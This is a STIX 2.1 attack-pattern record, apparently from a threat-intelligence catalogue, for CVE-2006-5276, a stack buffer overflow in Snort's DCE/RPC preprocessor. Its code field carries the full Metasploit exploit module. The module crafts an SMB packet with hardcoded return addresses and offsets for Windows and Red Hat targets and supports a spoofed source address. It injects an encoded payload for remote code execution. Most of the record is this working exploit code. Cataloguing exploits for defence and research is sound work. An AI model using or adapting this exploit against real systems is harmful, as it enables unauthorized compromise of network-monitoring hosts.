{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70586fb3-e05e-47ac-b2e7-a3cef48aa51b",
    "created": "2024-08-14T17:07:13.934325Z",
    "modified": "2024-08-14T17:07:13.93433Z",
    "name": "Snort 2 DCE/RPC Preprocessor Buffer Overflow",
    "description": " This module allows remote attackers to execute arbitrary code by exploiting the Snort service via crafted SMB traffic. The vulnerability is due to a boundary error within the DCE/RPC preprocessor when reassembling SMB Write AndX requests which may result a stack-based buffer overflow with a specially crafted packet sent on a network that is monitored by Snort.  Vulnerable versions include Snort 2.6.1, 2.7 Beta 1 and SourceFire IDS 4.1, 4.5 and 4.6.  Any host on the Snort network may be used as the remote host. The remote host does not need to be running the SMB service for the exploit to be successful. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/ids/snort_dce_rpc.rb",
            "external_id": "snort_dce_rpc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5276"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20070221235015/http://www.snort.org/docs/advisory-2007-02-19.html"
        },
        {
            "source_name": "reference",
            "url": "http://sf-freedom.blogspot.com/2007/02/snort-261-dcerpc-preprocessor-remote.html"
        },
        {
            "source_name": "reference",
            "url": "http://downloads.securityfocus.com/vulnerabilities/exploits/22616-linux.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Capture\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Snort 2 DCE/RPC Preprocessor Buffer Overflow',\n      'Description'     => %q{\n          This module allows remote attackers to execute arbitrary code by exploiting the\n        Snort service via crafted SMB traffic. The vulnerability is due to a boundary\n        error within the DCE/RPC preprocessor when reassembling SMB Write AndX requests,\n        which may result a stack-based buffer overflow with a specially crafted packet\n        sent on a network that is monitored by Snort.\n\n        Vulnerable versions include Snort 2.6.1, 2.7 Beta 1 and SourceFire IDS 4.1, 4.5 and 4.6.\n\n        Any host on the Snort network may be used as the remote host. The remote host does not\n        need to be running the SMB service for the exploit to be successful.\n      },\n      'Author'          =>\n        [\n          'Neel Mehta', #Original discovery (IBM X-Force)\n          'Trirat Puttaraksa', #POC\n          'Carsten Maartmann-Moe <carsten[at]carmaa.com>',  #Metasploit win\n          '0a29406d9794e4f9b30b3c5d6702c708' #Metasploit linux\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'OSVDB', '32094' ],\n          [ 'CVE', '2006-5276' ],\n          [ 'URL', 'http://web.archive.org/web/20070221235015/http://www.snort.org/docs/advisory-2007-02-19.html'],\n          [ 'URL', 'http://sf-freedom.blogspot.com/2007/02/snort-261-dcerpc-preprocessor-remote.html'],\n          [ 'URL', 'http://downloads.securityfocus.com/vulnerabilities/exploits/22616-linux.py']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'         =>\n        {\n          'Space'         => 390,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true,\n        },\n      'Platform'        => %w{ win linux },\n      'Targets'         =>\n        [\n          [\n            'Windows Universal',\n            {\n              'Platform' => 'win',\n              'Ret'    => 0x00407c01,  # JMP ESP snort.exe\n              'Offset' => 289,         # The number of bytes before overwrite\n              'Padding' => 0\n            }\n          ],\n          [\n            'Redhat 8',\n            {\n              'Platform' => 'linux',\n              'Ret' => 0xbffff110,\n              'Offset' => 317,\n              'Padding' => 28\n            }\n          ]\n        ],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2007-02-19',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        Opt::RPORT(139),\n        OptAddress.new('RHOST', [ true,  'A host on the Snort-monitored network' ]),\n        OptAddress.new('SHOST', [ false, 'The (potentially spoofed) source address'])\n      ])\n\n    deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT')\n  end\n\n  def exploit\n    open_pcap\n\n    shost = datastore['SHOST'] || Rex::Socket.source_address(rhost)\n\n    p = buildpacket(shost, rhost, rport.to_i)\n\n    print_status(\"#{rhost}:#{rport} Sending crafted SMB packet from #{shost}...\")\n\n    return unless capture_sendto(p, rhost)\n\n    handler\n  end\n\n  def buildpacket(shost, rhost, rport)\n    p = PacketFu::TCPPacket.new\n    p.ip_saddr = shost\n    p.ip_daddr = rhost\n    p.tcp_dport = rport\n    p.tcp_flags.psh = 1\n    p.tcp_flags.ack = 1\n\n    # SMB packet borrowed from https://www.exploit-db.com/exploits/3362\n\n    # NetBIOS Session Service, value is the number of bytes in the TCP segment,\n    # must be greater than the total size of the payload. Statically set.\n    header = \"\\x00\\x00\\xde\\xad\"\n\n    # SMB Header\n    header << \"\\xff\\x53\\x4d\\x42\\x75\\x00\\x00\\x00\\x00\\x18\\x07\\xc8\\x00\\x00\"\n    header << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\"\n    header << \"\\x00\\x08\\x30\\x00\"\n\n    # Tree Connect AndX Request\n    header << \"\\x04\\xa2\\x00\\x52\\x00\\x08\\x00\\x01\\x00\\x27\\x00\\x00\"\n    header << \"\\x5c\\x00\\x5c\\x00\\x49\\x00\\x4e\\x00\\x53\\x00\\x2d\\x00\\x4b\\x00\\x49\\x00\"\n    header << \"\\x52\\x00\\x41\\x00\\x5c\\x00\\x49\\x00\\x50\\x00\\x43\\x00\\x24\\x00\\x00\\x00\"\n    header << \"\\x3f\\x3f\\x3f\\x3f\\x3f\\x00\"\n\n    # NT Create AndX Request\n    header << \"\\x18\\x2f\\x00\\x96\\x00\\x00\\x0e\\x00\\x16\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    header << \"\\x9f\\x01\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    header << \"\\x03\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x40\\x00\\x40\\x00\\x02\\x00\\x00\\x00\"\n    header << \"\\x01\\x11\\x00\\x00\\x5c\\x00\\x73\\x00\\x72\\x00\\x76\\x00\\x73\\x00\\x76\\x00\"\n    header << \"\\x63\\x00\\x00\\x00\"\n\n    # Write AndX Request #1\n    header << \"\\x0e\\x2f\\x00\\xfe\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x80\"\n    header << \"\\x00\\x48\\x00\\x00\\x00\\x48\\x00\\xb6\\x00\\x00\\x00\\x00\\x00\\x49\\x00\\xee\"\n    header << \"\\x05\\x00\\x0b\\x03\\x10\\x00\\x00\\x00\\xff\\x01\\x00\\x00\\x01\\x00\\x00\\x00\"\n    header << \"\\xb8\\x10\\xb8\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\"\n    header << \"\\xc8\\x4f\\x32\\x4b\\x70\\x16\\xd3\\x01\\x12\\x78\\x5a\\x47\\xbf\\x6e\\xe1\\x88\"\n    header << \"\\x03\\x00\\x00\\x00\\x04\\x5d\\x88\\x8a\\xeb\\x1c\\xc9\\x11\\x9f\\xe8\\x08\\x00\"\n    header << \"\\x2b\\x10\\x48\\x60\\x02\\x00\\x00\\x00\"\n\n    # Write AndX Request #2\n    header << \"\\x0e\\xff\\x00\\xde\\xde\\x00\\x40\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x80\"\n    header << \"\\x00\\x48\\x00\\x00\\x00\\xff\\x01\"\n    tail = \"\\x00\\x00\\x00\\x00\\x49\\x00\\xee\"\n\n    # Return address\n    eip =  [target['Ret']].pack('V')\n\n    # Sploit\n    sploit = make_nops(10)\n    sploit << payload.encoded\n\n    # Padding (to pass size check)\n    sploit << make_nops(1)\n\n    # The size to be included in Write AndX Request #2, including sploit payload\n    requestsize = [(sploit.size() + target['Offset'])].pack('v')\n\n    # Assemble the parts into one package\n    p.payload = header << requestsize << tail << make_nops(target['Padding']) << eip << sploit\n\n    p.recalc\n\n    p\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-02-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}